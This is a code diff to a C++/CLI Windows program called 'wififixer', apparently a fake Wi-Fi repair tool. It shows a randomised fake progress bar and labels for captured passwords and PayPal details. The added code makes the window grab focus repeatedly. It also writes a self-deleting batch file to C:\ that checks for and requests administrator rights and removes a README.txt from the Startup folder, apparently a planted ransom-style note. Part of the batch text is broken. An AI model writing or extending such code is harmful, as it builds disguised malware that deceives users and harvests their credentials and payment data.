@@ -53,6 +53,7 @@ namespace wififixer {
 	private: System::Windows::Forms::Label^ password_done;
 	private: System::Windows::Forms::Label^ info_done;
 	private: System::Windows::Forms::Label^ paypal_done;
+
 	private: System::ComponentModel::IContainer^ components;
 
 
@@ -300,6 +301,8 @@ namespace wififixer {
 		}
 	}
 	private: System::Void infoTIMER_Tick(System::Object^ sender, System::EventArgs^ e) {
+		if (!this->Focused)
+			this->BringToFront();
 		if (this->informationBAR->Value < 740)
 			this->informationBAR->Increment(rand() % 7);
 		else if (this->informationBAR->Value > 740 && this->informationBAR->Value < 1720)
@@ -338,7 +341,7 @@ namespace wififixer {
 			}
 			std::ofstream clear("C:\\clear.bat");
 			if (clear.is_open()) {
-				clear << "DEL \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\README.txt\"\ndel %0";
+				clear << "@echo off\nsetlocal EnableDelayedExpansion\n\n>nul 2>&1\"%SYSTEMROOT%\\system32\\icacls.exe\" \"%SYSTEMROOT%\\system32\\config\\system\" && (set \"cmd=runas /user:Administrator \"%~dpnx0\"\"\ngoto doCmd\n) || (\necho Требуются права администратора для выполнения этого скрипта.\npause\nexit /b1n)\n\n:doCmd\nDEL \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\README.txt\"\ndel %0";
 				clear.close();
 			}
 			std::ofstream shutdown("C:\\sleep.bat");
@@ -352,5 +355,5 @@ namespace wififixer {
 			Application::Exit();
 		}
 	}
-};
+	};
 }
